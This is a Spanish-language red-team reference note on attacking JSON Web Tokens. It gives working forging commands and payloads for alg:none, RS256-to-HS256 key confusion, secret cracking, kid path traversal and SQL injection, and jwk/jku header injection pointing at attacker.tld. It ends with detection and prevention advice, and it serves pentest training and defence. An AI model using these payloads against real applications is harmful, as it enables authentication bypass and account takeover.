---
aliases:
  - JSON Web Token Attacks
  - JWT Abuse
  - JWT Tampering
tags:
  - type/atomic
  - vuln/auth-bypass
  - technique/credential-access
  - asset/web-app
  - cred/jwt
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Explotación Web]]"
type: Atomic
linked:
  - "[[Authentication & Authorization Bypass]]"
  - "[[Cookies y Sesiones]]"
---
# JWT Attacks

***

## Cheatsheet
^jwt-attacks

| Ataque | Requisito | Técnica | Tool |
| --- | --- | --- | --- |
| **`alg: none`** | Backend acepta `none` | Cambiar header, vaciar signature | `jwt_tool -X a` |
| **Key confusion RS256→HS256** | Pub key leakeada/obtenible | Firmar HS256 usando pub key como secret | `jwt_tool -X k -pk pub.pem` |
| **Weak HS256 secret** | Secret corto/común | Crackear offline | `hashcat -m 16500`, `john --format=HMAC-SHA256` |
| **`kid` path traversal** | `kid` no sanitizado | Apuntar a archivo conocido (`/dev/null`, uploadeado) | `jwt_tool -X i` |
| **`kid` SQLi** | `kid` usa query SQL | UNION select secret | Manual |
| **`jwk` header injection** | Backend confía `jwk` | Inyectar pub key propia | `jwt_tool -X s` |
| **`jku` header injection** | Backend fetch `jku` URL | Apuntar a JWKS propio | `jwt_tool -X u` |
| **`x5u` / `x5c` injection** | Backend valida cert inline | Self-signed cert propio | Manual |
| **Algorithm substitution** | Validación débil | Downgrade a algoritmo inseguro | `jwt_tool -T` |
| **Token expiration / replay** | Sin `jti` o corto TTL | Reusar token capturado | `curl` |
| **Sensitive data in payload** | Info en claims | Decodear, leer | `jwt.io` |

***

## Estructura

```
header.payload.signature
```

Cada parte: `base64url(JSON)`. Signature cubre `base64url(header) + "." + base64url(payload)`.

```bash
echo -n "eyJhbGci..." | cut -d. -f1 | base64 -d
```

## 1. `alg: none`

```json
{"alg":"none","typ":"JWT"}
{"sub":"admin","role":"admin"}
```

Signature vacía (`header.payload.`). Variantes: `None`, `NONE`, `nOnE` (case bypass).

```bash
jwt_tool eyJ... -X a
```

## 2. Key confusion RS256→HS256

Algoritmo RSA → HMAC: server usa misma key. Atacante obtiene pub key → firma HS256 usando pub key como secret.

```bash
# Descargar pub key
openssl s_client -connect victim:443 | openssl x509 -pubkey -noout > pub.pem

# Forjar con jwt_tool
jwt_tool eyJ... -X k -pk pub.pem
```

Manual:
```python
import jwt
pub = open('pub.pem').read()
token = jwt.encode({"sub":"admin"}, pub, algorithm="HS256")
```

## 3. Weak secret cracking

```bash
# Hashcat
hashcat -m 16500 token.txt rockyou.txt

# John
echo "eyJ..." > jwt.txt
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
```

Secretos comunes: `secret`, `your-256-bit-secret`, nombre app, JWT_SECRET env leaked.

## 4. `kid` injection

Header:
```json
{"alg":"HS256","kid":"../../../../../dev/null"}
```

Con `/dev/null` como key → HS256 con secret vacío:
```python
jwt.encode(payload, "", algorithm="HS256")
```

Path traversal a archivo conocido/uploadeable:
```json
{"kid":"../../../tmp/uploaded.txt"}
```

SQLi en `kid`:
```
{"kid":"x' UNION SELECT 'attacker_secret' -- -"}
```

## 5. `jwk` header injection

Atacante embebe su propia pub key en el header:
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "...attacker pub n...",
    "e": "AQAB"
  }
}
```

Server confía el `jwk` embebido → verifica con clave del atacante.

```bash
jwt_tool eyJ... -X s
```

## 6. `jku` / `x5u` URL injection

```json
{"alg":"RS256","jku":"https://attacker.tld/jwks.json"}
```

Hostear JWKS con pub key propia. Bypass filtros:
- `https://victim.tld@attacker.tld/jwks.json`
- `https://victim.tld#@attacker.tld/jwks.json`
- SSRF chain si hay whitelist.

## 7. Algorithm substitution / downgrade

Algunos libs aceptan header opcional o default a algoritmo débil si falta validación estricta de `alg`.

```bash
jwt_tool eyJ... -T  # tampering interactivo
```

## 8. Token capture + replay

- Tokens sin `exp` / `iat` / `jti` → válidos para siempre.
- Tokens con TTL largo (>24h) → window de replay grande.
- Sin revocation list → logout no invalida token.

***

## Tools

- **jwt_tool** (`ticarpi/jwt_tool`) — swiss-army, todos los ataques.
- **jwt.io** — decode + verify online (cuidado con tokens reales).
- **hashcat** `-m 16500` — JWT HS256 crack.
- **jwt-cracker** (`lmammino/jwt-cracker`) — brute específico.
- **Burp JWT Editor** extension — firma/edición inline en Repeater.
- **python-jose** / **PyJWT** — manipulación custom.

## Detección

```bash
# Localizar tokens
grep -rE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' /path

# Decodear rápido
python3 -c "import sys,base64,json; h,p,_=sys.argv[1].split('.'); print(json.dumps(json.loads(base64.urlsafe_b64decode(p+'==')), indent=2))" "eyJ..."
```

## Prevención

- Whitelist explícita de `alg`. Rechazar `none` siempre.
- Secret HS256 >= 256 bits random.
- Validar `iss`, `aud`, `exp`, `nbf`, `iat`.
- `kid` sanitizado (no path traversal, no SQLi).
- Rechazar `jwk`, `jku`, `x5u` en header salvo caso de uso específico con URL whitelist estricta.
- Short TTL + refresh tokens + revocation list.
- No meter datos sensibles en payload (es base64, no encriptación).

## Recursos

- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt)
- [jwt_tool wiki](https://github.com/ticarpi/jwt_tool/wiki)
- [HackTricks - JWT](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)

***
